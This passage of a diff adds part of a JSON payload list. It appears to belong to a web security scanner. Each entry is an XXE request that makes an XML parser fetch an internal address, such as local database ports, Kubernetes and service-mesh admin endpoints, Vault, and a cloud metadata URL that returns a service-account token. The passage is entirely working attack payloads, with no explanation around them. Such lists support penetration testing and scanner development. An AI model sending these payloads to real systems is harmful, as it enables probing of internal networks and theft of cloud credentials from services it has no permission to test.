+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:7000\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - etcd Cluster",
+        "description": "SSRF to etcd cluster",
+        "method": "POST",
+        "endpoint": "/etcd-cluster",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:2380\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Cassandra Cluster",
+        "description": "SSRF to Cassandra cluster",
+        "method": "POST",
+        "endpoint": "/cassandra-cluster",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:7000\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Couchbase",
+        "description": "SSRF to Couchbase",
+        "method": "POST",
+        "endpoint": "/couchbase",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:8091\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Riak",
+        "description": "SSRF to Riak",
+        "method": "POST",
+        "endpoint": "/riak",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:8087\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Neo4j",
+        "description": "SSRF to Neo4j",
+        "method": "POST",
+        "endpoint": "/neo4j",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:7474\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - ArangoDB",
+        "description": "SSRF to ArangoDB",
+        "method": "POST",
+        "endpoint": "/arangodb",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:8529\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - RethinkDB",
+        "description": "SSRF to RethinkDB",
+        "method": "POST",
+        "endpoint": "/rethinkdb",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:8080\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - TimescaleDB",
+        "description": "SSRF to TimescaleDB",
+        "method": "POST",
+        "endpoint": "/timescaledb",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:5432\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - CockroachDB",
+        "description": "SSRF to CockroachDB",
+        "method": "POST",
+        "endpoint": "/cockroachdb",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:26257\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - MinIO",
+        "description": "SSRF to MinIO object storage",
+        "method": "POST",
+        "endpoint": "/minio",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:9000\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Ceph",
+        "description": "SSRF to Ceph storage",
+        "method": "POST",
+        "endpoint": "/ceph",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:6789\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - GlusterFS",
+        "description": "SSRF to GlusterFS",
+        "method": "POST",
+        "endpoint": "/glusterfs",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:24007\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Harbor",
+        "description": "SSRF to Harbor registry",
+        "method": "POST",
+        "endpoint": "/harbor",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:8080\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Nexus",
+        "description": "SSRF to Nexus repository",
+        "method": "POST",
+        "endpoint": "/nexus",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:8081\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Artifactory",
+        "description": "SSRF to Artifactory",
+        "method": "POST",
+        "endpoint": "/artifactory",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:8082\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - GitLab Internal",
+        "description": "SSRF to GitLab internal",
+        "method": "POST",
+        "endpoint": "/gitlab-internal",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://gitlab-webservice.default.svc.cluster.local\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Kubernetes Internal",
+        "description": "SSRF to Kubernetes internal services",
+        "method": "POST",
+        "endpoint": "/k8s-internal",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://kube-dns.kube-system.svc.cluster.local\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Istio",
+        "description": "SSRF to Istio services",
+        "method": "POST",
+        "endpoint": "/istio",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://istio-pilot.istio-system.svc.cluster.local:8080\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Linkerd",
+        "description": "SSRF to Linkerd services",
+        "method": "POST",
+        "endpoint": "/linkerd",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://linkerd-admin-api.linkerd.svc.cluster.local:9990\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Envoy",
+        "description": "SSRF to Envoy admin",
+        "method": "POST",
+        "endpoint": "/envoy",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:9901\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Nginx Plus",
+        "description": "SSRF to Nginx Plus status",
+        "method": "POST",
+        "endpoint": "/nginx-plus",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:8080/status\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - HAProxy",
+        "description": "SSRF to HAProxy stats",
+        "method": "POST",
+        "endpoint": "/haproxy",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:1936\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Traefik",
+        "description": "SSRF to Traefik dashboard",
+        "method": "POST",
+        "endpoint": "/traefik",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:8080\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Kong",
+        "description": "SSRF to Kong admin API",
+        "method": "POST",
+        "endpoint": "/kong",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:8001\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Tyk",
+        "description": "SSRF to Tyk dashboard",
+        "method": "POST",
+        "endpoint": "/tyk",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:3000\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Ambassador",
+        "description": "SSRF to Ambassador admin",
+        "method": "POST",
+        "endpoint": "/ambassador",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:8877\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Gloo",
+        "description": "SSRF to Gloo control plane",
+        "method": "POST",
+        "endpoint": "/gloo",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:9091\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Consul Connect",
+        "description": "SSRF to Consul Connect",
+        "method": "POST",
+        "endpoint": "/consul-connect",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:8501\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Vault Internal",
+        "description": "SSRF to Vault internal",
+        "method": "POST",
+        "endpoint": "/vault-internal",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://vault.vault.svc.cluster.local:8200\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - External IP",
+        "description": "SSRF to external IP ranges",
+        "method": "POST",
+        "endpoint": "/external-ip",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://8.8.8.8\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Cloud Metadata",
+        "description": "SSRF to various cloud metadata",
+        "method": "POST",
+        "endpoint": "/cloud-metadata",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\"> ]><data>&xxe;</data>"
+        }
     }
-}
+]
